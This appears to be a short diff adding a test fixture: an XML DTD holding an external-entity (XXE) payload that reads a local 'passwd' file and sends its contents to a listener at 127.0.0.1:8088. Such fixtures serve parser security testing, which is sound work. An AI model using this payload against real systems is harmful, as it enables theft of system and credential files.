@@ -1,0 +1,3 @@
+<!ENTITY % b SYSTEM "passwd">
+<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'http://127.0.0.1:8088/%b;'>">
+%c;
